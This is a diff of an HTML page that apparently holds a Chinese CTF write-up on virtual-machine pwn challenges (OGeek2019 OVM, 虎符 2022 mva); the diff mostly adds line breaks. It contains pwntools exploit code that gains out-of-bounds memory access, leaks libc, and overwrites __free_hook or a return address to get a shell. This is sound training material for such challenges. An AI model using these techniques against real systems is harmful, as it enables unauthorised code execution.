@@ -7595,12 +7595,12 @@
   <h1>VMPwn</h1>
 
 <h2 id="vmpwn">VMPwn</h2>
-<p>VMPwn 一般是程序实现了一个虚拟机，定义了一些 opcode，对用户输入指定格式的 opcode 进行解析，然后执行，这类题目一般是越界导致任意地址的读写，修改函数指针进而 getshell
+<p>VMPwn 一般是程序实现了一个虚拟机，定义了一些 opcode，对用户输入指定格式的 opcode 进行解析，然后执行，这类题目一般是越界导致任意地址的读写，修改函数指针进而 getshell<br />
 感觉这类题，和题目交互的逻辑以及格式都得逆很久才能理解...</p>
 <h2 id="ogeek2019-finalovm">[OGeek2019 Final]OVM</h2>
-<p>题目：<a href="https://buuoj.cn/challenges#[OGeek2019%20Final]OVM">https://buuoj.cn/challenges#[OGeek2019%20Final]OVM</a>
-主要的逻辑在 execute 这个函数里面，前面就是让输入了 PC、SP 寄存器的值，要执行的 code 的大小和内容
-<img alt="image.png" src="../img/9th-OMjx6IB8OVcM/1707103517389-b05f41f9-45eb-4f39-89ba-89690f25e397-464174.png" />
+<p>题目：<a href="https://buuoj.cn/challenges#[OGeek2019%20Final]OVM">https://buuoj.cn/challenges#[OGeek2019%20Final]OVM</a><br />
+主要的逻辑在 execute 这个函数里面，前面就是让输入了 PC、SP 寄存器的值，要执行的 code 的大小和内容<br />
+<img alt="image.png" src="../img/9th-OMjx6IB8OVcM/1707103517389-b05f41f9-45eb-4f39-89ba-89690f25e397-464174.png" /><br />
 梳理所有的功能：</p>
 <pre><code class="language-python">输入的Opcode含义格式如下：最高位是区分指令的，往后的高中低是用来作为操作数的
 0x10：寄存器置为最低位，reg[高] = 低
@@ -7619,9 +7619,9 @@
 0xE0：退出，当reg[13]也就是sp不为0时可打印寄存器reg[0]到reg[15]信息
 [X]0xFF：打印寄存器reg[0]到reg[15]信息
 </code></pre>
-<p>发送的数据格式是啥？前面的倒是正常输入就行，后面的 code 格式是啥，code 通过一个循环进行输入，输入的次数就是前面输入的 code size，每次输入的都是一个整型的数
-（而且这里会检查你的最高位是不是 0xFF，如果是的话就会直接给你赋值为 0xE0，因此想要使用 0xFF 直接打印寄存器是走不通的）
-<img alt="image.png" src="../img/9th-OMjx6IB8OVcM/1707115848929-24f26143-3ff4-4a90-ae1c-5dbf45eec10e-770346.png" />
+<p>发送的数据格式是啥？前面的倒是正常输入就行，后面的 code 格式是啥，code 通过一个循环进行输入，输入的次数就是前面输入的 code size，每次输入的都是一个整型的数<br />
+（而且这里会检查你的最高位是不是 0xFF，如果是的话就会直接给你赋值为 0xE0，因此想要使用 0xFF 直接打印寄存器是走不通的）<br />
+<img alt="image.png" src="../img/9th-OMjx6IB8OVcM/1707115848929-24f26143-3ff4-4a90-ae1c-5dbf45eec10e-770346.png" /><br />
 尝试按照如下格式，倒是没啥问题，可以执行：</p>
 <pre><code class="language-python">#coding=utf-8
 from pwn import *
@@ -7641,7 +7641,7 @@ for i in range(len(code)):
 p.sendlineafter(&quot;HOW DO YOU FEEL AT OVM?&quot;,&quot;yichen&quot;)
 p.interactive()
 </code></pre>
-<p>然后来考虑怎么利用，题目中对 memory 和 reg 的索引都是通过我们输入的下标来完成的，reg 还好说，没有定义的 reg 写了也没啥用，但是 memory 是和程序本身的内存在一块的，因此如果可以控制 memory 到程序本身的内存中实际可以完成任意地址的读写
+<p>然后来考虑怎么利用，题目中对 memory 和 reg 的索引都是通过我们输入的下标来完成的，reg 还好说，没有定义的 reg 写了也没啥用，但是 memory 是和程序本身的内存在一块的，因此如果可以控制 memory 到程序本身的内存中实际可以完成任意地址的读写<br />
 首先来完成写操作，内存在 BSS 段中起始地址：0x202060，大小：0x10000，通过以下指令将寄存器 1 中的数据写到了内存 menory[reg[3]] 中</p>
 <pre><code class="language-python">code = [
     0x20030000,   #寄存器3设置为0
@@ -7653,8 +7653,8 @@ p.interactive()
     0xE0000000,   #退出并打印寄存器信息
 ]
 </code></pre>
-<p>不知道为啥，总是会把我要用的寄存器加 1，我置零也不管用，就直接赋值了
-<img alt="image.png" src="../img/9th-OMjx6IB8OVcM/1707186162194-6e6c9c91-faa9-457b-b7c1-be1c85c9444d-796864.png" />
+<p>不知道为啥，总是会把我要用的寄存器加 1，我置零也不管用，就直接赋值了<br />
+<img alt="image.png" src="../img/9th-OMjx6IB8OVcM/1707186162194-6e6c9c91-faa9-457b-b7c1-be1c85c9444d-796864.png" /><br />
 尝试通过任意地址写把寄存器的值赋到非 memory 的位置（R1 赋到了 memory[-1]）</p>
 <pre><code class="language-python">code = [
     0x20030000,   #寄存器3设置为0
@@ -7667,7 +7667,7 @@ p.interactive()
     0xE0000000,   #退出并打印寄存器信息
 ]
 </code></pre>
-<p><img alt="image.png" src="../img/9th-OMjx6IB8OVcM/1707128404908-34f5da1e-a525-439a-b4ff-b6505285419c-335227.png" />
+<p><img alt="image.png" src="../img/9th-OMjx6IB8OVcM/1707128404908-34f5da1e-a525-439a-b4ff-b6505285419c-335227.png" /><br />
 再试一下任意地址读 memory[-8] 读到 R1（0x60-0x40=0x20，0x20/0x4=8）</p>
 <pre><code class="language-python">code = [
     0x20030000,   #寄存器3设置为0
@@ -7678,14 +7678,14 @@ p.interactive()
     0xE0000000,   #退出并打印寄存器信息
 ]
 </code></pre>
-<p><img alt="image.png" src="../img/9th-OMjx6IB8OVcM/1707128913720-7d7a9395-40aa-4edd-9937-c95696877b2b-728786.png" />
+<p><img alt="image.png" src="../img/9th-OMjx6IB8OVcM/1707128913720-7d7a9395-40aa-4edd-9937-c95696877b2b-728786.png" /><br />
 到这里读写就完成了，接下来就是怎么利用了</p>
 <pre><code class="language-python">bss + 0x202040   comment
 bss + 0x202060   memory
 bss + 0x242060   reg
 </code></pre>
-<p>看了 wp，comment 在结束的时候会 free 掉，如果把 free_hook 改为 system，把 comment 指向的内容改为 "/bin/sh" 即可
-关键这些位置在什么地方呢，妈的他们都知道，就是不写怎么算的 Orz...
+<p>看了 wp，comment 在结束的时候会 free 掉，如果把 free_hook 改为 system，把 comment 指向的内容改为 "/bin/sh" 即可<br />
+关键这些位置在什么地方呢，妈的他们都知道，就是不写怎么算的 Orz...<br />
 在 bss 段上面有一个 got 表，其中 write 函数的偏移地址是：0x201F88 距离 memory 偏移 D8，D8/4=36，所以直接减去 37 就可以把 write 函数的低四位放到 R1 寄存器中，减去 38 把 write 函数的高四位放到 R2 寄存器中</p>
 <pre><code class="language-python">code = [
     0x20030000,   #寄存器3设置为0
@@ -7700,10 +7700,10 @@ bss + 0x242060   reg
     0xE0000000,   #退出并打印寄存器信息
 ]
 </code></pre>
-<p><img alt="image.png" src="../img/9th-OMjx6IB8OVcM/1707187314827-f091a897-63e0-41d3-b269-f89c1cf7f75b-022596.png" />
-0x7FFFF7B043B0，后面调用的，free_hook 函数地址应该是这么看吧，偏移为：0x2cf3f8，试了几次这个是固定的，但是不知道在平台上是不是固定的 Orz...
-<img alt="image.png" src="../img/9th-OMjx6IB8OVcM/1707189516988-f0db3a29-fd84-4c61-9975-decdbdc1e3cf-682617.png" />
-<img alt="image.png" src="../img/9th-OMjx6IB8OVcM/1707189606313-e6f8022b-7dc6-468c-aa8e-9e1033a6a241-778281.png" />
+<p><img alt="image.png" src="../img/9th-OMjx6IB8OVcM/1707187314827-f091a897-63e0-41d3-b269-f89c1cf7f75b-022596.png" /><br />
+0x7FFFF7B043B0，后面调用的，free_hook 函数地址应该是这么看吧，偏移为：0x2cf3f8，试了几次这个是固定的，但是不知道在平台上是不是固定的 Orz...<br />
+<img alt="image.png" src="../img/9th-OMjx6IB8OVcM/1707189516988-f0db3a29-fd84-4c61-9975-decdbdc1e3cf-682617.png" /><br />
+<img alt="image.png" src="../img/9th-OMjx6IB8OVcM/1707189606313-e6f8022b-7dc6-468c-aa8e-9e1033a6a241-778281.png" /><br />
 那么问题来了，如何把 R2 R1 中存的 write 函数的地址减去一个偏移得到 free_hook 的地址呢，其实前面的 R2 都不用动，这个地址太大了，直接把 R1 减去 0x2cf3f8 就行</p>
 <pre><code class="language-python">code = [
     0x20030000,   #寄存器3设置为0
@@ -7727,8 +7727,8 @@ bss + 0x242060   reg
     0xE0000000,   #退出并打印寄存器信息
 ]
 </code></pre>
-<p><img alt="image.png" src="../img/9th-OMjx6IB8OVcM/1707197258616-2a1152c1-881e-47e9-bb87-39a475c21506-672153.png" />
-free hook 改为什么呢，system 函数？距离 write 函数相差 0xb2010，也就是减完之后要再加回来 0x2cf3f8-0xb2010=0x21d3e8
+<p><img alt="image.png" src="../img/9th-OMjx6IB8OVcM/1707197258616-2a1152c1-881e-47e9-bb87-39a475c21506-672153.png" /><br />
+free hook 改为什么呢，system 函数？距离 write 函数相差 0xb2010，也就是减完之后要再加回来 0x2cf3f8-0xb2010=0x21d3e8<br />
 <img alt="image.png" src="../img/9th-OMjx6IB8OVcM/1707197835867-cf5eb0c1-d918-4e19-a1da-dc2fdc689a16-364929.png" /></p>
 <pre><code class="language-python">code = [
     0x20030000,   #寄存器3设置为0
@@ -7760,9 +7760,9 @@ free hook 改为什么呢，system 函数？距离 write 函数相差 0xb2010，
     0xE0000000,   #退出并打印寄存器信息
 ]
 </code></pre>
-<p>到这又卡住了，我怎么往里写呢，这个地址在我寄存器里面，我只能通过数组的越界去写，而我通过 reg 来控制偏移到不了那么大的啊 Orz...
-看了其他人的 WP 发现是通过控制 comment 实现的，comment 存了一个指针，通过修改这个指针到 free_hook 附近的任何地址，可以直接把 /bin/sh 写过去，顺便把 free_hook 给覆盖了，那么我们就把 comment 写成 free_hook - 8，这样最后 comment 的时候先发 /bin/sh 覆盖了 free_hook - 8，再发 system 把 free_hook 给覆盖了，然后 free 的时候就可以执行 system('/bin/sh') 了
-comment 相对 memory 的偏移是：0x202060 - 0x202040 = 0x20，再除以 4 得到 8，另外因为原来的程序时
+<p>到这又卡住了，我怎么往里写呢，这个地址在我寄存器里面，我只能通过数组的越界去写，而我通过 reg 来控制偏移到不了那么大的啊 Orz...<br />
+看了其他人的 WP 发现是通过控制 comment 实现的，comment 存了一个指针，通过修改这个指针到 free_hook 附近的任何地址，可以直接把 /bin/sh 写过去，顺便把 free_hook 给覆盖了，那么我们就把 comment 写成 free_hook - 8，这样最后 comment 的时候先发 /bin/sh 覆盖了 free_hook - 8，再发 system 把 free_hook 给覆盖了，然后 free 的时候就可以执行 system('/bin/sh') 了<br />
+comment 相对 memory 的偏移是：0x202060 - 0x202040 = 0x20，再除以 4 得到 8，另外因为原来的程序时<br />
 <strong>所以上一步计算 system 函数的过程没用了，也不用在寄存器倒腾偏移了😅</strong></p>
 <pre><code class="language-python">code = [
     0x20030000,   #寄存器3设置为0
@@ -7870,11 +7870,11 @@ p.interactive()
 <h2 id="xciscn_2021_game">【X】ciscn_2021_game</h2>
 <p>这题有点复杂，还不止是个虚拟机的题，还有些逻辑，还有些游戏逻辑， wp 写的很简略，以后再看</p>
 <h2 id="ctf-2022-mva">虎符CTF 2022 mva</h2>
-<p>这道题诡异得很，IDA 解析错了很多地方，先来看 v7 的赋值函数，这个函数是每次循环最先运行的，应该是取提取 opcode 的
-<img alt="image.png" src="../img/9th-OMjx6IB8OVcM/1708308275044-8b2de088-c2a2-4aec-b305-98fd6f7de1ab-268086.png" />
-进到函数里面，大体上看是一个转换字节序的操作，通过 dword_403C += 4 这条指令可以看出来，每条指令的长度有四字节
-<img alt="image.png" src="../img/9th-OMjx6IB8OVcM/1708308395253-01b2e31f-f6c9-468b-89db-3792a134f2b6-773496.png" />
-从这里可以得知，你输入的 opcode 会以四字节一组来解析，并且会转换大小端序，比如你输入的是 0xAABBCCDD，那么 0xDDCCBBAA 被赋值给了 v7
+<p>这道题诡异得很，IDA 解析错了很多地方，先来看 v7 的赋值函数，这个函数是每次循环最先运行的，应该是取提取 opcode 的<br />
+<img alt="image.png" src="../img/9th-OMjx6IB8OVcM/1708308275044-8b2de088-c2a2-4aec-b305-98fd6f7de1ab-268086.png" /><br />
+进到函数里面，大体上看是一个转换字节序的操作，通过 dword_403C += 4 这条指令可以看出来，每条指令的长度有四字节<br />
+<img alt="image.png" src="../img/9th-OMjx6IB8OVcM/1708308395253-01b2e31f-f6c9-468b-89db-3792a134f2b6-773496.png" /><br />
+从这里可以得知，你输入的 opcode 会以四字节一组来解析，并且会转换大小端序，比如你输入的是 0xAABBCCDD，那么 0xDDCCBBAA 被赋值给了 v7<br />
 后面涉及到一些取值的问题，这里解析一下</p>
 <pre><code class="language-python">假如输入的是：0xAABBCCDD
 那么v7是：0xDDCCBBAA
@@ -7902,7 +7902,7 @@ D：reg[0xCC] = reg[0xBB] * reg[0xAA]   这里没检查SBYTE1也就是0xBB这一
 E：reg[0xBB] = reg[0xCC]        这里对0xBB这一位的检查是无符号数检查
 F：打印栈顶的值
 </code></pre>
-<p>这些里面检查机制也乱得很，有的只检查一个操作数，有的检查两个，有的是带符号数检查，有的是无符号数检查
+<p>这些里面检查机制也乱得很，有的只检查一个操作数，有的检查两个，有的是带符号数检查，有的是无符号数检查<br />
 利用主要集中在 0xD 和 0xE 这两个操作码上，接下来再理解一下数据格式，就是四字节一组，使用 p32 直接拼起来即可，最后直接使用 \x00 补全到 0x100 个字节</p>
 <pre><code class="language-python">payload = p32(0x11223309)+p32(0x0f00000f)
 payload += (0x100 - len(payload)) * b'\x00'
@@ -7947,10 +7947,10 @@ def inverse(num):         # 反转
 <pre><code class="language-python">gdb.attach(p,&quot;b*$rebase(0x1368)&quot;)
 pause()
 </code></pre>
-<p>接下来就是泄露 libc 基址、计算 one_gadget 地址、覆盖返回地址
-先看泄露 libc 基址，首先来确定一下 reg 的地址在哪，通过 IDA 可以看到 v10 是在栈上的，是 rbp-21C，那么调试的时候看一下在附近的可能能泄露 libc 地址的偏移在什么地方，在 reg[-0x1C] 处，reg[-28]<img alt="image.png" src="../img/9th-OMjx6IB8OVcM/1708327979051-147f293b-6657-47a6-9524-3a72cc6d6c26-491719.png" />
-写负数有些麻烦，不妨换一个，这里偏移为 0x34
-<img alt="image.png" src="../img/9th-OMjx6IB8OVcM/1708329543882-f7431206-9c62-4341-bdeb-9f52e1f34b98-942324.png" />
+<p>接下来就是泄露 libc 基址、计算 one_gadget 地址、覆盖返回地址<br />
+先看泄露 libc 基址，首先来确定一下 reg 的地址在哪，通过 IDA 可以看到 v10 是在栈上的，是 rbp-21C，那么调试的时候看一下在附近的可能能泄露 libc 地址的偏移在什么地方，在 reg[-0x1C] 处，reg[-28]<img alt="image.png" src="../img/9th-OMjx6IB8OVcM/1708327979051-147f293b-6657-47a6-9524-3a72cc6d6c26-491719.png" /><br />
+写负数有些麻烦，不妨换一个，这里偏移为 0x34<br />
+<img alt="image.png" src="../img/9th-OMjx6IB8OVcM/1708329543882-f7431206-9c62-4341-bdeb-9f52e1f34b98-942324.png" /><br />
 payload 如下：</p>
 <pre><code class="language-python">payload  = load(0,1)        # reg[0]=1
 payload += mul(1,34,0)      # reg[1]=reg[34]*reg[0]
@@ -8015,15 +8015,15 @@ pause()
 p.sendafter(&quot;input your code now :&quot;,payload)
 p.interactive()
 </code></pre>
-<p>参考：
-<a href="https://forum.butian.net/share/1128">奇安信攻防社区-VMPWN初探-不愿再探</a>
-<a href="https://blog.xmcve.com/2022/04/11/VMpwn%E6%80%BB%E7%BB%93/">VMpwn总结</a>
-<a href="https://a1ex.online/2020/11/20/VMPwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/">VMPwn入门学习</a>
-<a href="https://x1ng.top/2020/12/17/%E5%AD%A6%E4%B9%A0VM-PWN/">学习VM PWN - X1ng’s Blog</a>
-<a href="https://c0yo7e.github.io/2020/08/15/VMPwn/">VMPwn | The lair of C0yo7e</a>
-<a href="https://xz.aliyun.com/t/6865?time__1311=n4%2BxnD0DRDyBox053b7AdYvQD5i%3DD9nGYD">VMpwn 学习笔记 - 先知社区</a>
-<a href="https://xz.aliyun.com/t/7787?time__1311=n4%2BxnD0G0%3DIxBDRhDBqrodK3Ks8GODmOrD">VMPwn之温故知新 - 先知社区</a>
-<a href="https://blog.csdn.net/qq_54218833/article/details/123943312">虎符CTF-2022 mva 题解_2022 虎符 pwn mva-CSDN博客</a>
+<p>参考：<br />
+<a href="https://forum.butian.net/share/1128">奇安信攻防社区-VMPWN初探-不愿再探</a><br />
+<a href="https://blog.xmcve.com/2022/04/11/VMpwn%E6%80%BB%E7%BB%93/">VMpwn总结</a><br />
+<a href="https://a1ex.online/2020/11/20/VMPwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/">VMPwn入门学习</a><br />
+<a href="https://x1ng.top/2020/12/17/%E5%AD%A6%E4%B9%A0VM-PWN/">学习VM PWN - X1ng’s Blog</a><br />
+<a href="https://c0yo7e.github.io/2020/08/15/VMPwn/">VMPwn | The lair of C0yo7e</a><br />
+<a href="https://xz.aliyun.com/t/6865?time__1311=n4%2BxnD0DRDyBox053b7AdYvQD5i%3DD9nGYD">VMpwn 学习笔记 - 先知社区</a><br />
+<a href="https://xz.aliyun.com/t/7787?time__1311=n4%2BxnD0G0%3DIxBDRhDBqrodK3Ks8GODmOrD">VMPwn之温故知新 - 先知社区</a><br />
+<a href="https://blog.csdn.net/qq_54218833/article/details/123943312">虎符CTF-2022 mva 题解_2022 虎符 pwn mva-CSDN博客</a><br />
 <a href="https://blog.csdn.net/qq_45323960/article/details/123680295">2022虎符 mva_dylib 反编译-CSDN博客</a></p>
 <blockquote>
 <p>原文: <a href="https://www.yuque.com/hxfqg9/bin/hvd6thisgy7r96v3">https://www.yuque.com/hxfqg9/bin/hvd6thisgy7r96v3</a></p>
